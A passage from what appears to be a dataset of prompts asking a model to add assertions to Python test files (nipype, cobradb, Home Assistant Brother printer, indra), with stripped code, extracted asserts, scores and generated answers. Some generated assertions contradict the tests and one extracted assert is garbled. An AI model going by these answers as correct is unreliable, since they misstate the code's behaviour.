5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['at', 'set_dimension', 'm', 'a', 'b', 'set_method', '_a', 'aprime', 'bprime', 'at.inputs.alpha', 'at.inputs.beta', 'attr', 'x', 'at.inputs.dimension', 'at.inputs.modalities', 'at.inputs.method', 'at.inputs.output_label_image', 'warped_intensity_images', 'at.inputs.warped_intensity_images', 'segmentation_images', 'at.inputs.warped_label_images', 'T1_image', 'at.inputs.target_image', 'at.inputs.patch_radius', 'at.inputs.search_radius', 'expected_command']
*Code:

1# -*- coding: utf-8 -*-
2from __future__ import division
3from builtins import range
4from nipype.testing import example_data
5from nipype.interfaces.base import InputMultiPath
6from traits.trait_errors import TraitError
7from nipype.interfaces.ants import JointFusion
8import pytest
9
10def test_JointFusion_dimension():
11    at = JointFusion()
12    set_dimension = lambda d: setattr(at.inputs, 'dimension', int(d))
13    for d in range(2, 5):
14        set_dimension(d)
15    for d in [0, 1, 6, 7]:
16        with pytest.raises(TraitError):
17            set_dimension(d)
18
19@pytest.mark.parametrize(""m"", range(1, 5))
20def test_JointFusion_modalities(m):
21    at = JointFusion()
22    setattr(at.inputs, 'modalities', int(m))
23
24@pytest.mark.parametrize(""a, b"", [(a,b) for a in range(10) for b in range(10)])
25def test_JointFusion_method(a, b):
26    at = JointFusion()
27    set_method = lambda a, b: setattr(at.inputs, 'method', 'Joint[%.1f,%d]'.format(a, b))
28    _a = a / 10.0
29    set_method(_a, b)
30    # set directly
31    aprime = _a + 0.1
32    bprime = b + 1
33    at.inputs.alpha = aprime
34    at.inputs.beta = bprime
35    # set with alpha/beta
36
37@pytest.mark.parametrize(""attr, x"", [(attr, x) for attr in ['patch_radius', 'search_radius'] for x in range(5)])
38def test_JointFusion_radius(attr, x):
39    at = JointFusion()
40    setattr(at.inputs, attr, [x, x+1, x**x])
41
42
43def test_JointFusion_cmd():
44    at = JointFusion()
45    at.inputs.dimension = 3
46    at.inputs.modalities = 1
47    at.inputs.method = 'Joint[0.1,2]'
48    at.inputs.output_label_image = 'fusion_labelimage_output.nii'
49    warped_intensity_images = [example_data('im1.nii'),
50                               example_data('im2.nii')]
51    at.inputs.warped_intensity_images = warped_intensity_images
52    segmentation_images = [example_data('segmentation0.nii.gz'),
53                           example_data('segmentation1.nii.gz')]
54    at.inputs.warped_label_images = segmentation_images
55    T1_image = example_data('T1.nii')
56    at.inputs.target_image = T1_image
57    at.inputs.patch_radius = [3, 2, 1]
58    at.inputs.search_radius = [1, 2, 3]
59    expected_command = ('jointfusion 3 1 -m Joint[0.1,2] -rp 3x2x1 -rs 1x2x3'
60                        ' -tg %s -g %s -g %s -l %s -l %s'
61                        ' fusion_labelimage_output.nii') % (T1_image,
62                                                            warped_intensity_images[0],
63                                                            warped_intensity_images[1],
64                                                            segmentation_images[0],
65                                                            segmentation_images[1])
66    # setting intensity or labels with unequal lengths raises error
67    with pytest.raises(AssertionError):
68        at._format_arg('warped_intensity_images', InputMultiPath, warped_intensity_images + [example_data('im3.nii')])
69",4808,"[[10, 'd', '>=', 2, ""the dimension should be equal or higher than 2""],
 [15, 'd', '<=', 5, ""the dimension should be equal or lower than 5""],
 [24, 'a', '>=', 0, ""a in method should be equal or higher than 0""],
 [24, 'b', '>=', 0, ""b in method should be equal or higher than 0""],
 [37, 'x', '>=', 0, ""radius attribute x should be equal or higher than 0""],
 [45, 'at.inputs.dimension', '==', 3, ""dimension input should be equal to 3""],
 [46, 'at.inputs.modalities', '==', 1, ""modality input should be equal to 1""],
 [57, 'at.inputs.patch_radius', '==', [3, 2, 1], ""patch radius input should be equal to [3, 2, 1]""],
 [58, 'at.inputs.search_radius', '==', [1, 2, 3], ""search radius input should be equal to [1, 2, 3]""],
 [67, 'len(warped_intensity_images)', '==', 'len(segmentation_images)', ""length of intensity images and segmentation images should be equal""]]"
SBRG/ome,"# -*- coding: utf-8 -*-

from cobradb.models import Session
from cobradb.map_loading import load_the_map

import pytest

def test_load_the_map(test_db):
    session = Session()

    assert load_the_map(None, None, None, 'x'*1000000) == 1
    with pytest.raises(Exception):
        load_the_map(None, None, None, 'x'*400000)
","
1# -*- coding: utf-8 -*-
2
3from cobradb.models import Session
4from cobradb.map_loading import load_the_map
5
6import pytest
7
8def test_load_the_map(test_db):
9    session = Session()
10
11    with pytest.raises(Exception):
12        load_the_map(None, None, None, 'x'*400000)
13","[['load_the_map(None', '==', 'True']]",1,1,1.0,0.0030864197530864,"['test_db', 'session']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['test_db', 'session']
*Code:

1# -*- coding: utf-8 -*-
2
3from cobradb.models import Session
4from cobradb.map_loading import load_the_map
5
6import pytest
7
8def test_load_the_map(test_db):
9    session = Session()
10
11    with pytest.raises(Exception):
12        load_the_map(None, None, None, 'x'*400000)
13",1684,"[[8, 'test_db', '!=', None, ""the test_db should not be None while testing the function load_the_map""],
 [11, 'session', '!=', None, ""session variable should not be None to perform a database operation""]]"
tchellomello/home-assistant,"""""""Define tests for the Brother Printer config flow.""""""
import json

from brother import SnmpError, UnsupportedModel

from homeassistant import data_entry_flow
from homeassistant.components.brother.const import DOMAIN
from homeassistant.config_entries import SOURCE_USER, SOURCE_ZEROCONF
from homeassistant.const import CONF_HOST, CONF_TYPE

from tests.async_mock import patch
from tests.common import MockConfigEntry, load_fixture

CONFIG = {CONF_HOST: ""localhost"", CONF_TYPE: ""laser""}


async def test_show_form(hass):
    """"""Test that the form is served with no input.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": SOURCE_USER}
    )

    assert result[""type""] == data_entry_flow.RESULT_TYPE_FORM
    assert result[""step_id""] == SOURCE_USER


async def test_create_entry_with_hostname(hass):
    """"""Test that the user step works with printer hostname.""""""
    with patch(
        ""brother.Brother._get_data"",
        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
    ):
        result = await hass.config_entries.flow.async_init(
            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_CREATE_ENTRY
        assert result[""title""] == ""HL-L2340DW 0123456789""
        assert result[""data""][CONF_HOST] == CONFIG[CONF_HOST]
        assert result[""data""][CONF_TYPE] == CONFIG[CONF_TYPE]


async def test_create_entry_with_ip_address(hass):
    """"""Test that the user step works with printer IP address.""""""
    with patch(
        ""brother.Brother._get_data"",
        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
    ):
        result = await hass.config_entries.flow.async_init(
            DOMAIN,
            context={""source"": SOURCE_USER},
            data={CONF_HOST: ""127.0.0.1"", CONF_TYPE: ""laser""},
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_CREATE_ENTRY
        assert result[""title""] == ""HL-L2340DW 0123456789""
        assert result[""data""][CONF_HOST] == ""127.0.0.1""
        assert result[""data""][CONF_TYPE] == ""laser""


async def test_invalid_hostname(hass):
    """"""Test invalid hostname in user_input.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN,
        context={""source"": SOURCE_USER},
        data={CONF_HOST: ""invalid/hostname"", CONF_TYPE: ""laser""},
    )

    assert result[""errors""] == {CONF_HOST: ""wrong_host""}


async def test_connection_error(hass):
    """"""Test connection to host error.""""""
    with patch(""brother.Brother._get_data"", side_effect=ConnectionError()):
        result = await hass.config_entries.flow.async_init(
            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
        )

        assert result[""errors""] == {""base"": ""connection_error""}


async def test_snmp_error(hass):
    """"""Test SNMP error.""""""
    with patch(""brother.Brother._get_data"", side_effect=SnmpError(""error"")):
        result = await hass.config_entries.flow.async_init(
            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
        )

        assert result[""errors""] == {""base"": ""snmp_error""}


async def test_unsupported_model_error(hass):
    """"""Test unsupported printer model error.""""""
    with patch(""brother.Brother._get_data"", side_effect=UnsupportedModel(""error"")):

        result = await hass.config_entries.flow.async_init(
            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_ABORT
        assert result[""reason""] == ""unsupported_model""


async def test_device_exists_abort(hass):
    """"""Test we abort config flow if Brother printer already configured.""""""
    with patch(
        ""brother.Brother._get_data"",
        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
    ):
        MockConfigEntry(domain=DOMAIN, unique_id=""0123456789"", data=CONFIG).add_to_hass(
            hass
        )
        result = await hass.config_entries.flow.async_init(
            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_ABORT
        assert result[""reason""] == ""already_configured""


async def test_zeroconf_no_data(hass):
    """"""Test we abort if zeroconf provides no data.""""""
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={""source"": SOURCE_ZEROCONF}
    )

    assert result[""type""] == data_entry_flow.RESULT_TYPE_ABORT
    assert result[""reason""] == ""connection_error""


async def test_zeroconf_not_brother_printer_error(hass):
    """"""Test we abort zeroconf flow if printer isn't Brother.""""""
    with patch(
        ""brother.Brother._get_data"",
        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
    ):

        result = await hass.config_entries.flow.async_init(
            DOMAIN,
            context={""source"": SOURCE_ZEROCONF},
            data={""hostname"": ""example.local."", ""name"": ""Another Printer""},
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_ABORT
        assert result[""reason""] == ""not_brother_printer""


async def test_zeroconf_snmp_error(hass):
    """"""Test we abort zeroconf flow on SNMP error.""""""
    with patch(""brother.Brother._get_data"", side_effect=SnmpError(""error"")):

        result = await hass.config_entries.flow.async_init(
            DOMAIN,
            context={""source"": SOURCE_ZEROCONF},
            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_ABORT
        assert result[""reason""] == ""connection_error""


async def test_zeroconf_device_exists_abort(hass):
    """"""Test we abort zeroconf flow if Brother printer already configured.""""""
    with patch(
        ""brother.Brother._get_data"",
        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
    ):
        MockConfigEntry(domain=DOMAIN, unique_id=""0123456789"", data=CONFIG).add_to_hass(
            hass
        )

        result = await hass.config_entries.flow.async_init(
            DOMAIN,
            context={""source"": SOURCE_ZEROCONF},
            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_ABORT
        assert result[""reason""] == ""already_configured""


async def test_zeroconf_confirm_create_entry(hass):
    """"""Test zeroconf confirmation and create config entry.""""""
    with patch(
        ""brother.Brother._get_data"",
        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
    ):

        result = await hass.config_entries.flow.async_init(
            DOMAIN,
            context={""source"": SOURCE_ZEROCONF},
            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
        )

        assert result[""step_id""] == ""zeroconf_confirm""
        assert result[""description_placeholders""][""model""] == ""HL-L2340DW""
        assert result[""description_placeholders""][""serial_number""] == ""0123456789""
        assert result[""type""] == data_entry_flow.RESULT_TYPE_FORM

        result = await hass.config_entries.flow.async_configure(
            result[""flow_id""], user_input={CONF_TYPE: ""laser""}
        )

        assert result[""type""] == data_entry_flow.RESULT_TYPE_CREATE_ENTRY
        assert result[""title""] == ""HL-L2340DW 0123456789""
        assert result[""data""][CONF_HOST] == ""example.local""
        assert result[""data""][CONF_TYPE] == ""laser""
","
1""""""Define tests for the Brother Printer config flow.""""""
2import json
3
4from brother import SnmpError, UnsupportedModel
5
6from homeassistant import data_entry_flow
7from homeassistant.components.brother.const import DOMAIN
8from homeassistant.config_entries import SOURCE_USER, SOURCE_ZEROCONF
9from homeassistant.const import CONF_HOST, CONF_TYPE
10
11from tests.async_mock import patch
12from tests.common import MockConfigEntry, load_fixture
13
14CONFIG = {CONF_HOST: ""localhost"", CONF_TYPE: ""laser""}
15
16
17async def test_show_form(hass):
18    """"""Test that the form is served with no input.""""""
19    result = await hass.config_entries.flow.async_init(
20        DOMAIN, context={""source"": SOURCE_USER}
21    )
22
23
24
25async def test_create_entry_with_hostname(hass):
26    """"""Test that the user step works with printer hostname.""""""
27    with patch(
28        ""brother.Brother._get_data"",
29        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
30    ):
31        result = await hass.config_entries.flow.async_init(
32            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
33        )
34
35
36
37async def test_create_entry_with_ip_address(hass):
38    """"""Test that the user step works with printer IP address.""""""
39    with patch(
40        ""brother.Brother._get_data"",
41        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
42    ):
43        result = await hass.config_entries.flow.async_init(
44            DOMAIN,
45            context={""source"": SOURCE_USER},
46            data={CONF_HOST: ""127.0.0.1"", CONF_TYPE: ""laser""},
47        )
48
49
50
51async def test_invalid_hostname(hass):
52    """"""Test invalid hostname in user_input.""""""
53    result = await hass.config_entries.flow.async_init(
54        DOMAIN,
55        context={""source"": SOURCE_USER},
56        data={CONF_HOST: ""invalid/hostname"", CONF_TYPE: ""laser""},
57    )
58
59
60
61async def test_connection_error(hass):
62    """"""Test connection to host error.""""""
63    with patch(""brother.Brother._get_data"", side_effect=ConnectionError()):
64        result = await hass.config_entries.flow.async_init(
65            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
66        )
67
68
69
70async def test_snmp_error(hass):
71    """"""Test SNMP error.""""""
72    with patch(""brother.Brother._get_data"", side_effect=SnmpError(""error"")):
73        result = await hass.config_entries.flow.async_init(
74            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
75        )
76
77
78
79async def test_unsupported_model_error(hass):
80    """"""Test unsupported printer model error.""""""
81    with patch(""brother.Brother._get_data"", side_effect=UnsupportedModel(""error"")):
82
83        result = await hass.config_entries.flow.async_init(
84            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
85        )
86
87
88
89async def test_device_exists_abort(hass):
90    """"""Test we abort config flow if Brother printer already configured.""""""
91    with patch(
92        ""brother.Brother._get_data"",
93        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
94    ):
95        MockConfigEntry(domain=DOMAIN, unique_id=""0123456789"", data=CONFIG).add_to_hass(
96            hass
97        )
98        result = await hass.config_entries.flow.async_init(
99            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
100        )
101
102
103
104async def test_zeroconf_no_data(hass):
105    """"""Test we abort if zeroconf provides no data.""""""
106    result = await hass.config_entries.flow.async_init(
107        DOMAIN, context={""source"": SOURCE_ZEROCONF}
108    )
109
110
111
112async def test_zeroconf_not_brother_printer_error(hass):
113    """"""Test we abort zeroconf flow if printer isn't Brother.""""""
114    with patch(
115        ""brother.Brother._get_data"",
116        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
117    ):
118
119        result = await hass.config_entries.flow.async_init(
120            DOMAIN,
121            context={""source"": SOURCE_ZEROCONF},
122            data={""hostname"": ""example.local."", ""name"": ""Another Printer""},
123        )
124
125
126
127async def test_zeroconf_snmp_error(hass):
128    """"""Test we abort zeroconf flow on SNMP error.""""""
129    with patch(""brother.Brother._get_data"", side_effect=SnmpError(""error"")):
130
131        result = await hass.config_entries.flow.async_init(
132            DOMAIN,
133            context={""source"": SOURCE_ZEROCONF},
134            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
135        )
136
137
138
139async def test_zeroconf_device_exists_abort(hass):
140    """"""Test we abort zeroconf flow if Brother printer already configured.""""""
141    with patch(
142        ""brother.Brother._get_data"",
143        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
144    ):
145        MockConfigEntry(domain=DOMAIN, unique_id=""0123456789"", data=CONFIG).add_to_hass(
146            hass
147        )
148
149        result = await hass.config_entries.flow.async_init(
150            DOMAIN,
151            context={""source"": SOURCE_ZEROCONF},
152            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
153        )
154
155
156
157async def test_zeroconf_confirm_create_entry(hass):
158    """"""Test zeroconf confirmation and create config entry.""""""
159    with patch(
160        ""brother.Brother._get_data"",
161        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
162    ):
163
164        result = await hass.config_entries.flow.async_init(
165            DOMAIN,
166            context={""source"": SOURCE_ZEROCONF},
167            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
168        )
169
170
171        result = await hass.config_entries.flow.async_configure(
172            result[""flow_id""], user_input={CONF_TYPE: ""laser""}
173        )
174
175","[['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_FORM'], ['result[""step_id""]', '==', 'SOURCE_USER'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_CREATE_ENTRY'], ['result[""title""]', '==', '""HL-L2340DW 0123456789""'], ['result[""data""][CONF_HOST]', '==', 'CONFIG[CONF_HOST]'], ['result[""data""][CONF_TYPE]', '==', 'CONFIG[CONF_TYPE]'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_CREATE_ENTRY'], ['result[""title""]', '==', '""HL-L2340DW 0123456789""'], ['result[""data""][CONF_HOST]', '==', '""127.0.0.1""'], ['result[""data""][CONF_TYPE]', '==', '""laser""'], ['result[""errors""]', '==', '{CONF_HOST: ""wrong_host""}'], ['result[""errors""]', '==', '{""base"": ""connection_error""}'], ['result[""errors""]', '==', '{""base"": ""snmp_error""}'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_ABORT'], ['result[""reason""]', '==', '""unsupported_model""'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_ABORT'], ['result[""reason""]', '==', '""already_configured""'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_ABORT'], ['result[""reason""]', '==', '""connection_error""'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_ABORT'], ['result[""reason""]', '==', '""not_brother_printer""'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_ABORT'], ['result[""reason""]', '==', '""connection_error""'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_ABORT'], ['result[""reason""]', '==', '""already_configured""'], ['result[""step_id""]', '==', '""zeroconf_confirm""'], ['result[""description_placeholders""][""model""]', '==', '""HL-L2340DW""'], ['result[""description_placeholders""][""serial_number""]', '==', '""0123456789""'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_FORM'], ['result[""type""]', '==', 'data_entry_flow.RESULT_TYPE_CREATE_ENTRY'], ['result[""title""]', '==', '""HL-L2340DW 0123456789""'], ['result[""data""][CONF_HOST]', '==', '""example.local""'], ['result[""data""][CONF_TYPE]', '==', '""laser""']]",33,33,1.0,0.0043958971626481,"['CONFIG', 'hass', 'result']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['CONFIG', 'hass', 'result']
*Code:

1""""""Define tests for the Brother Printer config flow.""""""
2import json
3
4from brother import SnmpError, UnsupportedModel
5
6from homeassistant import data_entry_flow
7from homeassistant.components.brother.const import DOMAIN
8from homeassistant.config_entries import SOURCE_USER, SOURCE_ZEROCONF
9from homeassistant.const import CONF_HOST, CONF_TYPE
10
11from tests.async_mock import patch
12from tests.common import MockConfigEntry, load_fixture
13
14CONFIG = {CONF_HOST: ""localhost"", CONF_TYPE: ""laser""}
15
16
17async def test_show_form(hass):
18    """"""Test that the form is served with no input.""""""
19    result = await hass.config_entries.flow.async_init(
20        DOMAIN, context={""source"": SOURCE_USER}
21    )
22
23
24
25async def test_create_entry_with_hostname(hass):
26    """"""Test that the user step works with printer hostname.""""""
27    with patch(
28        ""brother.Brother._get_data"",
29        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
30    ):
31        result = await hass.config_entries.flow.async_init(
32            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
33        )
34
35
36
37async def test_create_entry_with_ip_address(hass):
38    """"""Test that the user step works with printer IP address.""""""
39    with patch(
40        ""brother.Brother._get_data"",
41        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
42    ):
43        result = await hass.config_entries.flow.async_init(
44            DOMAIN,
45            context={""source"": SOURCE_USER},
46            data={CONF_HOST: ""127.0.0.1"", CONF_TYPE: ""laser""},
47        )
48
49
50
51async def test_invalid_hostname(hass):
52    """"""Test invalid hostname in user_input.""""""
53    result = await hass.config_entries.flow.async_init(
54        DOMAIN,
55        context={""source"": SOURCE_USER},
56        data={CONF_HOST: ""invalid/hostname"", CONF_TYPE: ""laser""},
57    )
58
59
60
61async def test_connection_error(hass):
62    """"""Test connection to host error.""""""
63    with patch(""brother.Brother._get_data"", side_effect=ConnectionError()):
64        result = await hass.config_entries.flow.async_init(
65            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
66        )
67
68
69
70async def test_snmp_error(hass):
71    """"""Test SNMP error.""""""
72    with patch(""brother.Brother._get_data"", side_effect=SnmpError(""error"")):
73        result = await hass.config_entries.flow.async_init(
74            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
75        )
76
77
78
79async def test_unsupported_model_error(hass):
80    """"""Test unsupported printer model error.""""""
81    with patch(""brother.Brother._get_data"", side_effect=UnsupportedModel(""error"")):
82
83        result = await hass.config_entries.flow.async_init(
84            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
85        )
86
87
88
89async def test_device_exists_abort(hass):
90    """"""Test we abort config flow if Brother printer already configured.""""""
91    with patch(
92        ""brother.Brother._get_data"",
93        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
94    ):
95        MockConfigEntry(domain=DOMAIN, unique_id=""0123456789"", data=CONFIG).add_to_hass(
96            hass
97        )
98        result = await hass.config_entries.flow.async_init(
99            DOMAIN, context={""source"": SOURCE_USER}, data=CONFIG
100        )
101
102
103
104async def test_zeroconf_no_data(hass):
105    """"""Test we abort if zeroconf provides no data.""""""
106    result = await hass.config_entries.flow.async_init(
107        DOMAIN, context={""source"": SOURCE_ZEROCONF}
108    )
109
110
111
112async def test_zeroconf_not_brother_printer_error(hass):
113    """"""Test we abort zeroconf flow if printer isn't Brother.""""""
114    with patch(
115        ""brother.Brother._get_data"",
116        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
117    ):
118
119        result = await hass.config_entries.flow.async_init(
120            DOMAIN,
121            context={""source"": SOURCE_ZEROCONF},
122            data={""hostname"": ""example.local."", ""name"": ""Another Printer""},
123        )
124
125
126
127async def test_zeroconf_snmp_error(hass):
128    """"""Test we abort zeroconf flow on SNMP error.""""""
129    with patch(""brother.Brother._get_data"", side_effect=SnmpError(""error"")):
130
131        result = await hass.config_entries.flow.async_init(
132            DOMAIN,
133            context={""source"": SOURCE_ZEROCONF},
134            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
135        )
136
137
138
139async def test_zeroconf_device_exists_abort(hass):
140    """"""Test we abort zeroconf flow if Brother printer already configured.""""""
141    with patch(
142        ""brother.Brother._get_data"",
143        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
144    ):
145        MockConfigEntry(domain=DOMAIN, unique_id=""0123456789"", data=CONFIG).add_to_hass(
146            hass
147        )
148
149        result = await hass.config_entries.flow.async_init(
150            DOMAIN,
151            context={""source"": SOURCE_ZEROCONF},
152            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
153        )
154
155
156
157async def test_zeroconf_confirm_create_entry(hass):
158    """"""Test zeroconf confirmation and create config entry.""""""
159    with patch(
160        ""brother.Brother._get_data"",
161        return_value=json.loads(load_fixture(""brother_printer_data.json"")),
162    ):
163
164        result = await hass.config_entries.flow.async_init(
165            DOMAIN,
166            context={""source"": SOURCE_ZEROCONF},
167            data={""hostname"": ""example.local."", ""name"": ""Brother Printer""},
168        )
169
170
171        result = await hass.config_entries.flow.async_configure(
172            result[""flow_id""], user_input={CONF_TYPE: ""laser""}
173        )
174
175",7303,"[[14, 'CONFIG', '==', 2, ""The CONFIG dictionary should be of size 2 as it is required to contain the host and type""],
 [19, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [31, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [43, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [53, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [64, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [73, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [83, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [98, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [106, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [119, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [131, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [149, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [164, 'hass', '!=', None, ""hass object should not be None as it is necessary for initiating the flow""],
 [171, 'hass', '!=', None, ""hass object should not be None as it is necessary to configure the flow""]]"
sorgerlab/belpy,"from indra.statements import *
from indra.assemblers.cx import CxAssembler, NiceCxAssembler, hub_layout

mek = Agent('MAP2K1', db_refs={'HGNC': '6840'})
erk = Agent('MAPK1', db_refs={'UP': 'P28482'})
dusp = Agent('DUSP4')
st_phos = Phosphorylation(mek, erk)
st_dephos = Dephosphorylation(dusp, erk)
st_complex = Complex([mek, erk, dusp])
st_complex2 = Complex([mek, mek, erk, erk, dusp])
st_act = Activation(mek, erk)
st_gef = Gef(Agent('SOS1'), Agent('HRAS'))
st_gap = Gap(Agent('RASA1'), Agent('HRAS'))
st_act2 = Inhibition(dusp, erk)
st_not_cited = Phosphorylation(mek, erk, evidence=[Evidence()])
st_cited = Phosphorylation(mek, erk, evidence=[Evidence(pmid='12345',
                                              text='MEK phosphorylates ERK')])
st_invalid_cited = Phosphorylation(mek, erk, evidence=[Evidence(pmid='api35',
                                              text='MEK phosphorylates ERK')])


def test_phos():
    cxa = CxAssembler()
    cxa.add_statements([st_phos])
    cxa.make_model()
    assert len(cxa.cx['nodes']) == 2
    assert len(cxa.cx['edges']) == 1


def test_phos_nice():
    cxa = NiceCxAssembler([st_cited])
    cxa.make_model()
    assert len(cxa.network.nodes) == 2
    assert len(cxa.network.edges) == 1
    print(cxa.print_model())


def test_gapgef_nice():
    cxa = NiceCxAssembler([st_gef, st_gap])
    cxa.make_model()
    assert len(cxa.network.nodes) == 3, cxa.network.nodes
    assert len(cxa.network.edges) == 2
    print(cxa.print_model())


def test_dephos():
    cxa = CxAssembler()
    cxa.add_statements([st_phos, st_dephos])
    cxa.make_model()
    assert len(cxa.cx['nodes']) == 3
    assert len(cxa.cx['edges']) == 2


def test_complex():
    cxa = CxAssembler()
    cxa.add_statements([st_complex])
    cxa.make_model()
    assert len(cxa.cx['nodes']) == 3
    assert len(cxa.cx['edges']) == 3


def test_complex2():
    cxa = CxAssembler()
    cxa.add_statements([st_complex2])
    cxa.make_model()
    assert len(cxa.cx['nodes']) == 3
    assert len(cxa.cx['edges']) == 5


def test_act():
    cxa = CxAssembler()
    cxa.add_statements([st_act, st_act2])
    cxa.make_model()
    assert len(cxa.cx['nodes']) == 3
    assert len(cxa.cx['edges']) == 2


def test_gef():
    cxa = CxAssembler()
    cxa.add_statements([st_gef])
    cxa.make_model()
    assert len(cxa.cx['nodes']) == 2
    assert len(cxa.cx['edges']) == 1


def test_gap():
    cxa = CxAssembler()
    cxa.add_statements([st_gap])
    cxa.make_model()
    assert len(cxa.cx['nodes']) == 2
    assert len(cxa.cx['edges']) == 1


def test_node_attributes():
    cxa = CxAssembler()
    cxa.add_statements([st_phos, st_dephos])
    cxa.make_model()
    assert len(cxa.cx['nodeAttributes']) == 5


def test_edge_attributes():
    cxa = CxAssembler()
